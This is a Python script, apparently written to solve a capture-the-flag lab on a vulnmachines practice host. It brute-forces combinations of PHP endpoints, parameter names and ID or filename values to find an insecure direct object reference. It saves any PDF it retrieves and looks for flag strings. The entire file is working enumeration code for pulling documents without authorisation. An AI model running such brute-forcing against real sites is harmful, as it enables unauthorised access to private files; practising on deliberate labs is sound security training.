#!/usr/bin/env python3
import requests

base = "http://hackme1.vulnmachines.com"

# Todos los posibles endpoints
endpoints = [
    "download.php", "Download.php", "DOWNLOAD.php",
    "file.php", "File.php", "FILE.php", 
    "pdf.php", "Pdf.php", "PDF.php",
    "get.php", "Get.php", "GET.php",
    "fetch.php", "Fetch.php", "FETCH.php",
    "view.php", "View.php", "VIEW.php",
    "load.php", "Load.php", "LOAD.php",
    "read.php", "Read.php", "READ.php",
    "document.php", "Document.php", "DOCUMENT.php",
    "files.php", "Files.php", "FILES.php",
    "pdfs.php", "Pdfs.php", "PDFS.php",
    "downloads.php", "Downloads.php", "DOWNLOADS.php",
    "export.php", "Export.php", "EXPORT.php",
    "index.php", "Index.php", "INDEX.php"
]

# Todos los posibles parámetros
params = [
    "pdf_id", "pdfid", "pdfId", "PdfId", "PDF_ID", "PDFID",
    "id", "Id", "ID",
    "file", "File", "FILE",
    "file_id", "fileid", "fileId", "FileId", "FILE_ID", "FILEID",
    "doc", "Doc", "DOC",
    "doc_id", "docid", "docId", "DocId", "DOC_ID", "DOCID",
    "document", "Document", "DOCUMENT",
    "document_id", "documentid", "documentId", "DocumentId", "DOCUMENT_ID",
    "download", "Download", "DOWNLOAD",
    "item", "Item", "ITEM",
    "object", "Object", "OBJECT",
    "path", "Path", "PATH",
    "name", "Name", "NAME",
    "filename", "Filename", "FILENAME", "fileName", "FileName"
]

# Valores a probar
values = list(range(0, 21)) + list(range(100, 105)) + list(range(999, 1002))
string_values = [
    "1.pdf", "2.pdf", "3.pdf", "file.pdf", "document.pdf", "pdf.pdf",
    "admin", "Admin", "ADMIN", "admin.pdf",
    "flag", "Flag", "FLAG", "flag.pdf",
    "secret", "Secret", "SECRET", "secret.pdf",
    "test", "Test", "TEST", "test.pdf",
    "demo", "Demo", "DEMO", "demo.pdf",
    "idor", "Idor", "IDOR", "idor.pdf",
    "vnm", "Vnm", "VNM", "vnm.pdf"
]

print("[*] Brute Force IDOR Search")
print("[*] Testing all combinations...")
print("-" * 60)

found = False

for endpoint in endpoints:
    if found:
        break
    for param in params:
        if found:
            break
        
        # Probar valores numéricos
        for value in values:
            url = f"{base}/{endpoint}?{param}={value}"
            try:
                r = requests.get(url, timeout=2)
                if r.status_code == 200:
                    # Verificar si es un PDF
                    if r.content[:4] == b'%PDF' or 'application/pdf' in r.headers.get('Content-Type', ''):
                        print(f"\n[!!!] PDF FOUND: {url}")
                        print(f"Size: {len(r.content)} bytes")
                        with open(f"/workspace/idor_found_{value}.pdf", 'wb') as f:
                            f.write(r.content)
                        print(f"Saved to: /workspace/idor_found_{value}.pdf")
                        if b'vnm{' in r.content.lower() or b'flag' in r.content.lower():
                            print("[!!!] PDF contains flag keywords!")
                        found = True
                        break
                    # Verificar si no es página por defecto
                    elif len(r.content) != 10918 and b'apache2 ubuntu' not in r.content.lower() and b'404 not found' not in r.content.lower():
                        if b'pdf' in r.content.lower() or b'download' in r.content.lower() or b'idor' in r.content.lower():
                            print(f"[!] Interesting: {url} - Size: {len(r.content)}")
            except:
                pass
        
        # Probar valores string
        for value in string_values:
            url = f"{base}/{endpoint}?{param}={value}"
            try:
                r = requests.get(url, timeout=2)
                if r.status_code == 200:
                    if r.content[:4] == b'%PDF' or 'application/pdf' in r.headers.get('Content-Type', ''):
                        print(f"\n[!!!] PDF FOUND: {url}")
                        print(f"Size: {len(r.content)} bytes")
                        with open(f"/workspace/idor_found_{value}", 'wb') as f:
                            f.write(r.content)
                        print(f"Saved to: /workspace/idor_found_{value}")
                        found = True
                        break
            except:
                pass

if not found:
    print("\n[-] No PDF found with standard endpoints")
    print("[*] Trying with directories...")
    
    # Probar con directorios
    dirs = ["idor", "IDOR", "Idor", "challenge", "Challenge", "CHALLENGE", 
            "lab", "Lab", "LAB", "mission", "Mission", "MISSION",
            "files", "Files", "FILES", "downloads", "Downloads", "DOWNLOADS",
            "pdfs", "Pdfs", "PDFS", "documents", "Documents", "DOCUMENTS"]
    
    for dir in dirs:
        if found:
            break
        for endpoint in ["download.php", "file.php", "pdf.php", "index.php", "get.php"]:
            if found:
                break
            for param in ["pdf_id", "id", "file", "doc"]:
                if found:
                    break
                for value in list(range(0, 11)) + ["admin", "flag", "1.pdf"]:
                    url = f"{base}/{dir}/{endpoint}?{param}={value}"
                    try:
                        r = requests.get(url, timeout=2)
                        if r.status_code == 200 and r.content[:4] == b'%PDF':
                            print(f"\n[!!!] PDF FOUND IN DIRECTORY: {url}")
                            with open(f"/workspace/dir_idor_{value}.pdf", 'wb') as f:
                                f.write(r.content)
                            found = True
                            break
                    except:
                        pass

if not found:
    print("\n[-] Still no PDF found")
    print("[!] The endpoint might be completely different or require special headers/cookies")